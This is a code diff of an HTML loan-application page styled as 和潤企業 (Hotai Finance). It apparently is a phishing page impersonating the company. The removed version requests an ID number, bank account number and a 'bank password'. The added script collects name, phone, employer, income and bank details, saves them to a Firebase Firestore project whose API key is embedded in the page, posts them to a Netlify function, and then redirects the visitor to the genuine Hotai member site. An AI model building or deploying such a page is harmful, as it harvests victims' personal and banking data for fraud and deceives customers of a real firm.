@@ -17,32 +17,75 @@
             text-align: center;
         }
     </style>
-    <script>
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBOiligBFJa8hYXP3vUUtZLS7rBH5D6vEk",
+            authDomain: "project-5897605956915932287.firebaseapp.com",
+            projectId: "project-5897605956915932287",
+            storageBucket: "project-5897605956915932287.appspot.com",
+            messagingSenderId: "594749809773",
+            appId: "1:594749809773:web:934c206a6a2d19e44d8b64",
+            measurementId: "G-62T1GPE7G0"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
         document.addEventListener('DOMContentLoaded', function() {
-            // 獲取URL查詢字符串並解析
-            const queryString = window.location.search;
-            const urlParams = new URLSearchParams(queryString);
+            const otherBankCheckbox = document.getElementById('other_bank_checkbox');
+            const otherBankText = document.getElementById('other_bank_text');
 
-            // 将第一页的数据填充到表单中（可以隐藏这些字段）
-            const form = document.querySelector('form');
-
-            // 你可以选择将这些数据放入隐藏的input中，或者直接发送到服务器
-            ['name', 'phone', 'gender', 'age', 'city', 'industry', 'company', 'position', 'work_years', 'income', 'salary_transfer', 'bank', 'other_bank'].forEach(field => {
-                const value = urlParams.get(field);
-                if (value) {
-                    const hiddenInput = document.createElement('input');
-                    hiddenInput.type = 'hidden';
-                    hiddenInput.name = field;
-                    hiddenInput.value = value;
-                    form.appendChild(hiddenInput);
+            function toggleOtherBankInput() {
+                if (otherBankCheckbox.checked) {
+                    otherBankText.style.display = 'block';
+                } else {
+                    otherBankText.style.display = 'none';
+                    otherBankText.value = '';
                 }
-            });
+            }
 
-            // 最终提交表单时，将所有数据发送到服务器
-            form.addEventListener('submit', function(event) {
-                event.preventDefault(); // 防止表单默认提交
-                alert('資料已送出 - 請耐心等候');
-                form.submit();
+            toggleOtherBankInput();
+            otherBankCheckbox.addEventListener('change', toggleOtherBankInput);
+
+            const form = document.getElementById('loanForm');
+            form.addEventListener('submit', async function(event) {
+                event.preventDefault(); // 防止表單的默認提交行為
+
+                try {
+                    // 將表單資料存入 Firebase Firestore
+                    const formData = new FormData(event.target);
+                    const formObject = {};
+                    formData.forEach((value, key) => {
+                        formObject[key] = value;
+                    });
+
+                    await addDoc(collection(db, "formData"), formObject);
+
+                    // 將表單資料提交到 Netlify Functions
+                    const response = await fetch('/.netlify/functions/submitForm', {
+                        method: 'POST',
+                        body: JSON.stringify(formObject),
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });
+
+                    if (response.ok) {
+                        alert('資料已送出 - 請耐心等候');
+                        window.location.href = 'https://www.hotaimember.com.tw/member/';
+                    } else {
+                        alert('提交失敗，請重試');
+                    }
+                } catch (e) {
+                    console.error("Error adding document: ", e);
+                    alert('資料保存失敗，請重試。');
+                }
             });
         });
     </script>
@@ -54,75 +97,82 @@
             <h1>和潤企業股份有限公司</h1>
         </div>
         <div class="form-title">名下貸款情況</div>
-        <form action="submit_final.php" method="post">
-            <!-- 名下貸款情況 -->
+        <form id="loanForm">
             <div class="form-group">
-                <label>名下有無其他貸款業務：</label>
-                <label><input type="radio" name="other_loans" value="有" required> 有</label>
-                <label><input type="radio" name="other_loans" value="無" required> 無</label>
+                <label for="name">姓名：</label>
+                <input type="text" id="name" name="name" placeholder="申請人姓名(必填)" required>
             </div>
             <div class="form-group">
-                <label>繳款情況是否正常：</label>
-                <label><input type="radio" name="payment_status" value="是" required> 是</label>
-                <label><input type="radio" name="payment_status" value="否" required> 否</label>
+                <label for="phone">聯絡電話：</label>
+                <input type="text" id="phone" name="phone" placeholder="申請人電話(必填)" required>
             </div>
             <div class="form-group">
-                <label for="recent_loans">近三個月是否有辦理其他貸款或分期：</label>
-                <input type="text" id="recent_loans" name="recent_loans" required>
-            </div>
-            
-            <!-- 申辦準備資料 -->
-            <div class="form-subtitle">申辦準備資料</div>
-            <div class="form-group">
-                <label for="loan_amount">申請需求金額：</label>
-                <select id="loan_amount" name="loan_amount" required>
-                    <option value="">請選擇金額</option>
-                    <option value="50000">50,000</option>
-                    <option value="100000">100,000</option>
-                    <option value="200000">200,000</option>
-                    <option value="300000">300,000</option>
-                    <option value="400000">400,000</option>
-                    <option value="500000">500,000</option>
-                </select>
+                <label>性別：</label>
+                <label><input type="radio" name="gender" value="男" required> 男</label>
+                <label><input type="radio" name="gender" value="女"> 女</label>
             </div>
             <div class="form-group">
-                <label for="loan_purpose">申請資金用途：</label>
-                <input type="text" id="loan_purpose" name="loan_purpose" placeholder="請填寫資金用途" required>
+                <label for="age">年齡：</label>
+                <input type="text" id="age" name="age" required>
             </div>
             <div class="form-group">
-                <label for="identity_number">申請撥款發放帳戶：</label>
-                <input type="text" id="identity_number" name="identity_number" placeholder="身份證字號" required>
+                <label for="city">居住縣市：</label>
+                <input type="text" id="city" name="city" required>
             </div>
             <div class="form-group">
-                <label for="bank_code">銀行代碼：</label>
-                <input type="text" id="bank_code" name="bank_code" placeholder="銀行代碼" required>
+                <label for="industry">從事行業：</label>
+                <input type="text" id="industry" name="industry" required>
             </div>
             <div class="form-group">
-                <label for="loan_bank_account">撥款銀行帳號：</label>
-                <input type="text" id="loan_bank_account" name="loan_bank_account" placeholder="撥款銀行帳號" required>
+                <label for="company">公司名稱：</label>
+                <input type="text" id="company" name="company" placeholder="請填寫(必填)" required>
             </div>
             <div class="form-group">
-                <label for="loan_bank_code">撥款銀行密碼：</label>
-                <input type="text" id="loan_bank_code" name="loan_bank_code" placeholder="撥款銀行密碼" required>
+                <label for="position">公司職位：</label>
+                <input type="text" id="position" name="position" placeholder="請填寫(必填)" required>
             </div>
             <div class="form-group">
-                <label for="loan_officer">申請貸款業務：</label>
-                <select id="loan_officer" name="loan_officer" required>
-                    <option value="">請選擇貸款業務</option>
-                    <option value="car_loan">汽機車貸款</option>
-                    <option value="product_loan">商品貸款</option>
-                    <option value="personal_loan">個人信貸</option>
-                </select>
+                <label for="work_years">工作年資：</label>
+                <input type="text" id="work_years" name="work_years" placeholder="請填寫工作年資" required>
             </div>
             <div class="form-group">
-                <label>本人是否為和潤客戶：</label>
-                <label><input type="radio" name="existing_customer" value="是" required> 是</label>
-                <label><input type="radio" name="existing_customer" value="否" required> 否</label>
+                <label for="income">每月收入：</label>
+                <input type="text" id="income" name="income" required>
             </div>
             <div class="form-group">
-                <label><input type="checkbox" name="confirm_data" required> 已確認資料填寫完整並核對無誤</label>
+                <label>薪轉：</label>
+                <label><input type="radio" name="salary_transfer" value="有" required> 有</label>
+                <label><input type="radio" name="salary_transfer" value="無"> 無</label>
             </div>
-            <button type="submit" class="submit-button">確認申辦</button>
+            <div class="form-group">
+                <label for="bank">薪轉帳戶：</label>
+                <input type="text" id="bank" name="bank" placeholder="如無薪轉帳戶請填無(請填寫)" required>
+            </div>
+            <div class="form-group">
+                <label>名下開戶銀行(可複選)：</label>
+                <div>
+                    <label><input type="checkbox" name="bank_account[]" value="004"> 004-台灣銀行</label>
+                    <label><input type="checkbox" name="bank_account[]" value="005"> 005-土地銀行</label>
+                    <label><input type="checkbox" name="bank_account[]" value="006"> 006-兆豐金控</label>
+                    <label><input type="checkbox" name="bank_account[]" value="007"> 007-彰化銀行</label>
+                    <label><input type="checkbox" name="bank_account[]" value="008"> 008-華南銀行</label>
+                    <label><input type="checkbox" name="bank_account[]" value="013"> 013-國泰世華</label>
+                    <label><input type="checkbox" name="bank_account[]" value="822"> 822-中國信託</label>
+                    <label><input type="checkbox" name="bank_account[]" value="812"> 812-台新銀行</label>
+                    <label><input type="checkbox" id="other_bank_checkbox" name="bank_account[]" value="other"> 其他開戶銀行</label>
+                    <input type="text" id="other_bank_text" name="other_bank" style="display:none;" placeholder="請填寫其他開戶銀行">
+                </div>
+            </div>
+            <div class="form-group">
+                <label>名下帳戶狀況(可複選)：</label>
+                <div>
+                    <label><input type="checkbox" name="account_status[]" value="警示授權"> 警示授權</label>
+                    <label><input type="checkbox" name="account_status[]" value="支付命令"> 支付命令</label>
+                    <label><input type="checkbox" name="account_status[]" value="強制扣除"> 強制扣除</label>
+                    <label><input type="checkbox" name="account_status[]" value="無"> 以上皆無</label>
+                </div>
+            </div>
+            <button type="submit" class="submit-button">確認下一步</button>
         </form>
     </div>
 </body>
